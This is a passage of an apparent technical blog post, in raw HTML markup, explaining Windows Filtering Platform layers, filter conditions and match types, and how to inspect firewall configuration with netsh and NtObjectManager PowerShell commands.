id="t.0"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c5"&gt;Name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c5"&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c5"&gt;FWPM_LAYER_ALE_AUTH_CONNECT_V4/6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c5"&gt;Processed when TCP connect() called.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c5"&gt;FWPM_LAYER_ALE_AUTH_LISTEN_V4/6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c5"&gt;Processed when TCP listen() called.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c5"&gt;FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4/6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c5"&gt;Processed when a packet/connection is received.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;What layers are used and in what order they are evaluated depend on the specific operation being performed. You can find the list of the layers for TCP packets &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/fwp/tcp-packet-flows"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and UDP packets &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/fwp/udp-packet-flows"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;. Now, let&amp;#39;s dig into how filter conditions are defined and what information they can check. &lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.b12oj4ik1roh"&gt;&lt;span class="c25"&gt;Filter Conditions&lt;/span&gt;&lt;/h2&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;Each filter contains an optional list of conditions which are used to match a packet. If no list is specified then the filter will always match any incoming packet and perform its defined action. If more than one condition is specified then the filter is only matched if all of the conditions match. If you have multiple conditions of the same type they&amp;#39;re OR&amp;#39;ed together, which allows a single filter to match on multiple values.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;Each condition contains three values:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_w3t1hchiy4w5-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;The layer field to check.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;The value to compare against.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;The match type, for example the packet value and the condition value are equal.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;Each layer has a list of fields that will be populated whenever a filter&amp;#39;s conditions are checked. The field might directly reflect a value from the packet, such as the destination IP address or the interface the packet is traversing. Or it could be a metadata value, such as the user identity of the process which created the socket. Some common fields are as follows:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.cd771d5d37490ff376385a74cca3438891315752"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c22 c7"&gt;Field Type&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c7 c22"&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c32"&gt;FWPM_CONDITION_IP_REMOTE_ADDRESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The remote IP address.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c9"&gt;FWPM_CONDITION_IP_LOCAL_ADDRESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The local IP address.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c9"&gt;FWPM_CONDITION_IP_PROTOCOL&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The IP protocol type, e.g. TCP or UDP&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c9"&gt;FWPM_CONDITION_IP_REMOTE_PORT&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The remote protocol port.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c9"&gt;FWPM_CONDITION_IP_LOCAL_PORT&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The local protocol port.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c9"&gt;FWPM_CONDITION_ALE_USER_ID&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The user&amp;#39;s identity.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c9"&gt;FWPM_CONDITION_ALE_REMOTE_USER_ID&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The remote user&amp;#39;s identity.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c9"&gt;FWPM_CONDITION_ALE_APP_ID&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The path to the socket&amp;#39;s executable.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c9"&gt;FWPM_CONDITION_ALE_PACKAGE_ID&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The user&amp;#39;s AppContainer package SID.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c9"&gt;FWPM_CONDITION_FLAGS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;A set of additional flags.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c9"&gt;FWPM_CONDITION_ORIGINAL_PROFILE_ID&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The source network interface profile.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c12"&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c9"&gt;FWPM_CONDITION_CURRENT_PROFILE_ID&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The current network interface profile.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The value to compare against the field can take different values depending on the field being checked. For example the field &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_IP_REMOTE_ADDRESS&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;can be compared to IPv4 or IPv6 addresses depending on the layer it&amp;#39;s used in. The value can also be a range, allowing a filter to match on an IP address within a bounded set of addresses.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_ALE_USER_ID&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_ALE_PACKAGE_ID&lt;/span&gt;&lt;span&gt;&amp;nbsp;conditions are based on the access token captured when creating the TCP or UDP socket. The &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_ALE_USER_ID&lt;/span&gt;&lt;span&gt;&amp;nbsp;stores a security descriptor which is used with an access check with the creator&amp;#39;s token. If the token is granted access then the condition is considered to match. For &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_ALE_PACKAGE_ID&lt;/span&gt;&lt;span&gt;&amp;nbsp;the condition checks the package SID of the AppContainer token. If the token is not an AppContainer then the filtering engine sets the package SID to the &lt;/span&gt;&lt;span class="c7"&gt;NULL SID (S-1-0-0)&lt;/span&gt;&lt;span class="c2"&gt;. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_ALE_REMOTE_USER_ID&lt;/span&gt;&lt;span&gt;&amp;nbsp;is similar to the &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_ALE_USER_ID&lt;/span&gt;&lt;span&gt;&amp;nbsp;condition but compares against the remote authenticated user. &lt;/span&gt;&lt;span&gt;In most cases sockets are not authenticated&lt;/span&gt;&lt;span class="c2"&gt;, however if IPsec is in use that can result in a remote user token being available to compare. It&amp;#39;s also used in some higher-level layers such as RPC filters.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;The match type can be one of the following:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_9fia5rt9e6y-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_EQUAL&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_EQUAL_CASE_INSENSITIVE&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_FLAGS_ALL_SET&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_FLAGS_ANY_SET&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_FLAGS_NONE_SET&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_GREATER&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_GREATER_OR_EQUAL&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_LESS&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_LESS_OR_EQUAL&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_NOT_EQUAL&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_NOT_PREFIX&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_PREFIX&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;FWP_MATCH_RANGE&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;The match types should hopefully be self explanatory based on their names. How the match is interpreted depends on the field&amp;#39;s type and the value being used to check against. &lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.xjr0mp71omhg"&gt;&lt;span class="c25"&gt;Inspecting the Firewall Configuration&lt;/span&gt;&lt;/h2&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;We now have an idea of the basics of how WFP works to filter network traffic. Let&amp;#39;s look at how to inspect the current configuration. We can&amp;#39;t use any of the normal firewall commands or UIs such as the PowerShell NetSecurity module as I already mentioned these represent the Windows Defender view of the firewall. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Instead we need to use the RPC APIs BFE exposes to access the configuration, for example you can access a filter using the &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/api/fwpmu/nf-fwpmu-fwpmfiltergetbykey0"&gt;FwpmFilterGetByKey0&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;API. Note that the BFE maintains security descriptors to restrict access to WFP objects. By default nothing can be accessed by non-administrators, therefore you&amp;#39;d need to call the RPC APIs while running as an administrator.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;You could implement your own tooling to call all the different APIs, but it&amp;#39;d be much easier if someone had already done it for us. For built-in tools the only one I know of is using &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts"&gt;netsh&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with the &lt;/span&gt;&lt;span class="c7"&gt;wfp &lt;/span&gt;&lt;span class="c2"&gt;namespace. For example to dump all the currently configured filters you can use the following command as an administrator:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.8d2c0a0c5175286b751a70c2aa752c5ba3d21d57"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c23"&gt;netsh wfp show filters file = -&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;This will print all filters in an XML format to the console. Be prepared to wait a while for the output to complete. You can also dump straight to a file. Of course you now need to interpret the XML results. It is possible to also specify certain parameters, such as local and remote addresses to reduce the output to only matching filters.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Processing an XML file doesn&amp;#39;t sound too appealing. To make the firewall configuration easier to inspect I&amp;#39;ve added many of the BFE APIs to my &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://www.powershellgallery.com/packages/NtObjectManager/1.1.31"&gt;NtObjectManager&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;PowerShell module from version 1.1.32 onwards. The module exposes various commands which will return objects representing the current WFP configuration which you can easily use to inspect and group the results however you see fit.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c33" id="h.325g1dtbp951"&gt;&lt;span class="c16"&gt;Layer Configuration&lt;/span&gt;&lt;/h3&gt; &lt;p class="c4"&gt;&lt;span&gt;Even though the layers are predefined in the WFP implementation it&amp;#39;s still useful to be able to query the details about them. For this you can use the &lt;/span&gt;&lt;span class="c7"&gt;Get-FwLayer&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;command.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.0b982091d7807de5c519581743d412c34929df42"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwLayer&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;KeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_LAYER_OUTBOUND_IPPACKET_V6 &amp;nbsp; Outbound IP Packet v6 Layer &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_LAYER_IPFORWARD_V4_DISCARD &amp;nbsp; IP Forward v4 Discard Layer &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_LAYER_ALE_AUTH_LISTEN_V4 &amp;nbsp; &amp;nbsp; ALE Listen v4 Layer&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The output shows the SDK name for the layer, if it has one, and the name of the layer that the BFE service has configured. The layer can be queried by its SDK name, its GUID or a numeric ID, which we will come back to later. As we mostly only care about the ALE layers then there&amp;#39;s a special &lt;/span&gt;&lt;span class="c7"&gt;AleLayer&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;parameter to query a specific layer without needing to remember the full name or ID.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.106a6412b9d80843ea8c42b8c5d55608f9a04818"&gt;&lt;/a&gt;&lt;a id="t.4"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;(Get-FwLayer -AleLayer ConnectV4).Fields&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;KeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Type &amp;nbsp; &amp;nbsp; &amp;nbsp;DataType &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;---- &amp;nbsp; &amp;nbsp; &amp;nbsp;-------- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_APP_ID &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;RawData &amp;nbsp; ByteBlob &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_USER_ID &amp;nbsp; &amp;nbsp; &amp;nbsp; RawData &amp;nbsp; TokenAccessInformation&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_IP_LOCAL_ADDRESS &amp;nbsp;IPAddress UInt32 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Each layer exposes the list of fields which represent the conditions which can be checked in that layer, you can access the list through the &lt;/span&gt;&lt;span class="c7"&gt;Fields&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;property. The output shown above contains a few of the condition types we saw earlier in the table of conditions. The output also shows the type of the condition and the data type you should provide when filtering on that condition.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.4b73d7702abe7cdd68619f2dfca206c3e7e04511"&gt;&lt;/a&gt;&lt;a id="t.5"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwSubLayer | Sort-Object Weight | Select KeyName, Weight&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;KeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Weight&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ------&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_SUBLAYER_INSPECTION &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_SUBLAYER_TEREDO &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 1&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;MICROSOFT_DEFENDER_SUBLAYER_FIREWALL &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 2&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;MICROSOFT_DEFENDER_SUBLAYER_WSH &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;3&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;MICROSOFT_DEFENDER_SUBLAYER_QUARANTINE &amp;nbsp; &amp;nbsp; 